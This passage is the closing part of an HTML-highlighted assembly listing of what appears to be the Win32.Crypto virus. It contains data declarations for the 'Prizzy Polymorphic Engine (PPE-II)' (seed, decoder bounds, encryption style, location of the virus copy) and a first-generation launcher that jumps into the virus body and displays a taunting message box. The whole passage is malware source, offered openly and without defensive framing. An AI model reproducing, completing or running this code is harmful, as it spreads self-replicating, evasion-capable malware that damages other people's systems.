        </span><span class="sc1">; Coprocessor buffer - natural logarithm</span><span class="sc0">

</span><span class="sc5">copro_nl_buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;all regz + all flagz</span><span class="sc0">

        </span><span class="sc1">; data used by Prizzy Polymorphic Engine (PPE-II)</span><span class="sc0">

</span><span class="sc5">poly_seed</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;last number in get_rnd32 function</span><span class="sc0">
</span><span class="sc5">garbage_style</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;have I use unmodify flags instructions ?</span><span class="sc0">

</span><span class="sc5">used_regs</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;used eax,ecx,edx...</span><span class="sc0">
</span><span class="sc5">gl_index_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;which reg is index ?</span><span class="sc0">
</span><span class="sc5">gl_index_reg2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;more complex - no comment :)</span><span class="sc0">

</span><span class="sc5">mem_address</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where's copy of this virus</span><span class="sc0">
</span><span class="sc5">poly_start</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where poly decoder start</span><span class="sc0">
</span><span class="sc5">poly_finish</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where poly decoder finish</span><span class="sc0">
</span><span class="sc5">recursive_level</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;garbage recursive layer</span><span class="sc0">

</span><span class="sc5">index_reg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;index_reg in base-reg</span><span class="sc0">
</span><span class="sc5">mlayer_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;mlayer_reg in base-reg</span><span class="sc0">
</span><span class="sc5">code_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;code_reg in base-reg</span><span class="sc0">

</span><span class="sc5">code_value</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;startup code value</span><span class="sc0">
</span><span class="sc5">code_value_add</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;next_code = code + this_c</span><span class="sc0">
</span><span class="sc5">crypt_style</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;(0=add/1=sub/2=xor) [---],reg32</span><span class="sc0">

</span><span class="sc5">decoder_back</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;address for JNZ loop</span><span class="sc0">
</span><span class="sc5">compare_index</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;where in &lt;compare_buffer&gt;</span><span class="sc0">
</span><span class="sc5">compare_buffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;see &lt;g_compare&gt; for more info</span><span class="sc0">

</span><span class="sc5">mem_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ first generation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; after installing, run it above</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">__pllg_lsize</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">original_ep</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__fg_run_this</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">

    </span><span class="sc5">__fg_run_this</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; display a simple message box</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Win32.Crypto - welcome to my world..."</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"First generation sample"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc1">; exit program - haha huahaha &lt;program&gt; :))</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">first_generation</span><span class="sc0">
</span></div></body>
</html>
